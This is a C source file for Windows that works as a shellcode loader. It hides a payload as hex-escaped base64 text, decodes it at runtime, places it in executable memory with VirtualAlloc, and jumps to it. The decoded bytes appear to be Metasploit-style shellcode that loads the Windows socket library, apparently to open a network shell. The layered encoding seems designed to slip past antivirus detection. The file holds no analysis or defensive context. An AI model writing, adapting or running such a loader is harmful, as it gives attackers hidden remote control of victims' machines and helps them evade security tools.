#include <stdio.h>
#include <string.h>
#include <Windows.h>

#include "Base64.h"

char buf[] =
"\x2f\x4f\x69\x43\x41\x41\x41\x41\x59\x49\x6e\x6c\x4d\x63\x42"
"\x6b\x69\x31\x41\x77\x69\x31\x49\x4d\x69\x31\x49\x55\x69\x33"
"\x49\x6f\x44\x37\x64\x4b\x4a\x6a\x48\x2f\x72\x44\x78\x68\x66"
"\x41\x49\x73\x49\x4d\x48\x50\x44\x51\x48\x48\x34\x76\x4a\x53"
"\x56\x34\x74\x53\x45\x49\x74\x4b\x50\x49\x74\x4d\x45\x58\x6a"
"\x6a\x53\x41\x48\x52\x55\x59\x74\x5a\x49\x41\x48\x54\x69\x30"
"\x6b\x59\x34\x7a\x70\x4a\x69\x7a\x53\x4c\x41\x64\x59\x78\x2f"
"\x36\x7a\x42\x7a\x77\x30\x42\x78\x7a\x6a\x67\x64\x66\x59\x44"
"\x66\x66\x67\x37\x66\x53\x52\x31\x35\x46\x69\x4c\x57\x43\x51"
"\x42\x30\x32\x61\x4c\x44\x45\x75\x4c\x57\x42\x77\x42\x30\x34"
"\x73\x45\x69\x77\x48\x51\x69\x55\x51\x6b\x4a\x46\x74\x62\x59"
"\x56\x6c\x61\x55\x66\x2f\x67\x58\x31\x39\x61\x69\x78\x4c\x72"
"\x6a\x56\x31\x6f\x4d\x7a\x49\x41\x41\x47\x68\x33\x63\x7a\x4a"
"\x66\x56\x47\x68\x4d\x64\x79\x59\x48\x69\x65\x6a\x2f\x30\x4c"
"\x69\x51\x41\x51\x41\x41\x4b\x63\x52\x55\x55\x47\x67\x70\x67"
"\x47\x73\x41\x2f\x39\x56\x71\x43\x6d\x6a\x41\x71\x4c\x65\x4b"
"\x61\x41\x49\x41\x45\x56\x79\x4a\x35\x6c\x42\x51\x55\x46\x42"
"\x41\x55\x45\x42\x51\x61\x4f\x6f\x50\x33\x2b\x44\x2f\x31\x5a"
"\x64\x71\x45\x46\x5a\x58\x61\x4a\x6d\x6c\x64\x47\x48\x2f\x31"
"\x59\x58\x41\x64\x41\x72\x2f\x54\x67\x68\x31\x37\x4f\x68\x6e"
"\x41\x41\x41\x41\x61\x67\x42\x71\x42\x46\x5a\x58\x61\x41\x4c"
"\x5a\x79\x46\x2f\x2f\x31\x59\x50\x34\x41\x48\x34\x32\x69\x7a"
"\x5a\x71\x51\x47\x67\x41\x45\x41\x41\x41\x56\x6d\x6f\x41\x61"
"\x46\x69\x6b\x55\x2b\x58\x2f\x31\x5a\x4e\x54\x61\x67\x42\x57"
"\x55\x31\x64\x6f\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67"
"\x41\x66\x53\x68\x59\x61\x41\x42\x41\x41\x41\x42\x71\x41\x46"
"\x42\x6f\x43\x79\x38\x50\x4d\x50\x2f\x56\x56\x32\x68\x31\x62"
"\x6b\x31\x68\x2f\x39\x56\x65\x58\x76\x38\x4d\x4a\x41\x2b\x46"
"\x63\x50\x2f\x2f\x2f\x2b\x6d\x62\x2f\x2f\x2f\x2f\x41\x63\x4d"
"\x70\x78\x6e\x58\x42\x77\x37\x76\x77\x74\x61\x4a\x57\x61\x67"
"\x42\x54\x2f\x39\x55\x3d";


int main(int argc, const char* argv[]) {


    char str3[1000] = { 0 };
    base64_decode(buf, (int)strlen(buf), str3);
    LPVOID Memory;

    Memory = VirtualAlloc(NULL, sizeof(str3), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(Memory, str3, sizeof(str3));

    ((void(*)())Memory)();

    return 0;
}